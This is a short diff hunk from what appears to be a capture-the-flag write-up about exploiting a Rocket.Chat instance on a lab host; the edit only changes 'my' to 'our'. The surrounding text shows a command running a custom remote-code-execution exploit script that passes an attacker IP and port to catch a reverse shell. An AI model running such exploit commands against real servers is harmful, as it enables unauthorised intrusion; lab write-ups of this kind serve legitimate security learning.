@@ -196,7 +196,7 @@ rce(target,ip_address,port)
 
 At this stage i spent alot of time testing different lines of code, searched for many hours and did countless attempts to get the payload to work. I had to use a modified snipet of code for the payload part from someone else and i manage to get it to work. 
 
-Now we can test my custom rocket.chat exploit to see if we recieve a shell on our attacker machine:
+Now we can test our custom rocket.chat exploit to see if we recieve a shell on our attacker machine:
 
 ```
 python3 ./rocket_chat_exploit.py -u test@test.com -a admin@rocket.thm -t 'http://chat.rocket.thm' -i my_ip_address -p 9001
